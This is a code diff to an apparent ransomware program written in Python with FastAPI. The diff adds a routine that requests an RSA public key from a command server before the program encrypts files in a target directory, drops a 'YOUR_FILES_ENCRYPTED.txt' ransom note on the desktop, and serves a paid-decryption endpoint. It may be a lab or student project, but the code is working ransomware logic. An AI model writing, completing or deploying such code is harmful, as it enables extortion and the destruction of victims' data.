@@ -12,6 +12,10 @@ EXPLANATION_FILENAME = 'YOUR_FILES_ENCRYPTED.txt'
 ENCRYPTED_FILE_TAG = 'ransom_encrypted'
 DIRECTORY_TO_ENCRYPT = 'RANSOM'
 
+
+
+
+
 app = FastAPI()
 
 @app.on_event('startup')
@@ -122,7 +126,39 @@ async def decrypt_files(transaction_id):
 
     return 'Successfully decrypted files. If you want to use service again please run the ransomware again :)'
 
+
+
+async def get_server_public_key(file_name):
+    try:
+        if(os.stat(file_name).st_size != 0):
+            return 1;
+
+    except:
+        pass
+
+    #a file with that name doesnot exist on this library or there is no data.
+    #we will request from the server the public key
+    try:
+        data = await http_requests.request_server_public_key()
+    except Exception as e:
+        print(e)
+    print(type(data))
+    if type(data) == dict and 'failed' in data:
+        print('the server cant generate a public key for usage')
+        return
+    
+    with open(file_name,"w") as f:
+        f.write(data)
+
+    return 0
+
+
+
+
+
 async def main():
+
+    await get_server_public_key("./keys/public.pem")
     rsa_cipher.setup()
 
     await encrypt_files()
@@ -132,7 +168,8 @@ async def main():
     shutil.copy(EXPLANATION_FILENAME, desktop_path)
 
     print('Successully encrypted files')
-
+ 
 
 if __name__ == "__main__":
-    uvicorn.run(app, host="127.0.0.1", port=8074)
+    #uvicorn.run(app, host="127.0.0.1", port=)
+    uvicorn.run("main:app", port=8074, host='127.0.0.1')
